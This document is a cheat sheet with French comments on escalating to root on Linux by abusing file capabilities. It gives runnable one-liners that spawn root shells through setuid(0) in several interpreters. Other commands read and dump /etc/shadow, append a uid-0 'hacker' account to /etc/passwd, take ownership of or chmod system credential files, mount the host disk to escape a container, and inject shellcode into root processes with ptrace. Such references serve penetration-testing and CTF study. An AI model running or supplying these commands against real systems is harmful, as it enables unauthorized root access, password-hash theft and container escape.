# Linux Capabilities Exploitation

# ============ ENUMERATION ============
getcap -r / 2>/dev/null

# ============================================
# cap_setuid+ep (DEVENIR ROOT)
# ============================================

# Python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# Ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# PHP
php -r 'posix_setuid(0); system("/bin/bash");'

# Node.js
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

# Gawk
gawk 'BEGIN {system("/bin/bash")}'

# ============================================
# cap_setgid+ep
# ============================================

# Python - rejoindre groupe root/shadow
python3 -c 'import os; os.setgid(0); os.system("/bin/bash")'

# Lire /etc/shadow (groupe shadow = gid 42 souvent)
python3 -c 'import os; os.setgid(42); print(open("/etc/shadow").read())'

# ============================================
# cap_dac_override+ep (LIRE/ECRIRE TOUT)
# ============================================

# Lire /etc/shadow
python3 -c 'print(open("/etc/shadow").read())'
cat /etc/shadow

# Ecrire dans /etc/passwd (ajouter user root)
# Générer hash: openssl passwd -1 "password" -> $1$xyz$...
echo 'hacker:$1$xyz$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd

# Vim
vim /etc/shadow

# ============================================
# cap_dac_read_search+ep (LIRE TOUT)
# ============================================

# Tar - extraire /etc/shadow
tar cvf shadow.tar /etc/shadow
tar xvf shadow.tar
cat etc/shadow

# Cat
cat /etc/shadow

# ============================================
# cap_chown+ep (CHANGER PROPRIO)
# ============================================

# S'approprier /etc/passwd
python3 -c 'import os; os.chown("/etc/passwd", 1000, 1000)'
# Puis modifier /etc/passwd pour ajouter user root

# S'approprier /etc/shadow
chown $(id -u):$(id -g) /etc/shadow

# ============================================
# cap_fowner+ep (BYPASS PROPRIO CHECK)
# ============================================

# Changer permissions de /etc/shadow
chmod 777 /etc/shadow
cat /etc/shadow

# ============================================
# cap_net_raw+ep (SNIFFING)
# ============================================

# Tcpdump
tcpdump -i any -w capture.pcap

# Python scapy
python3 -c 'from scapy.all import *; sniff()'

# ============================================
# cap_net_admin+ep
# ============================================

# Modifier routes, interfaces
# Sniffing réseau

# ============================================
# cap_sys_admin+ep (DANGEREUX)
# ============================================

# Mount - monter filesystem
mount /dev/sda1 /mnt

# Escape container via mount
mkdir /mnt/host
mount /dev/sda1 /mnt/host
cat /mnt/host/etc/shadow

# ============================================
# cap_sys_ptrace+ep (DEBUG PROCESSES)
# ============================================

# Injecter dans un process root
# Utiliser gdb ou strace sur process root
gdb -p <pid_root_process>
# Puis injecter shellcode

# Python injection
python3 -c '
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.ptrace(16, <pid>, 0, 0)  # PTRACE_ATTACH
# ... inject shellcode
'

# ============================================
# cap_net_bind_service+ep
# ============================================

# Bind port < 1024 (pas vraiment privesc mais utile)
python3 -c 'import socket; s=socket.socket(); s.bind(("0.0.0.0",80)); s.listen(1)'

# ============================================
# GTFOBINS CAPABILITIES
# ============================================

# Toujours checker : https://gtfobins.github.io/#+capabilities

# Binaires courants exploitables :
# - python/python3
# - perl
# - ruby
# - php
# - node
# - vim/vi
# - tar
# - gdb
# - openssl
# - gawk/awk

# ============================================
# QUICK REFERENCE
# ============================================

# cap_setuid     -> os.setuid(0) -> root shell
# cap_setgid     -> os.setgid(0) -> root group
# cap_dac_*      -> read/write any file -> /etc/shadow
# cap_chown      -> own any file -> /etc/passwd
# cap_fowner     -> chmod any file -> /etc/shadow
# cap_sys_admin  -> mount -> escape container
# cap_sys_ptrace -> inject root process
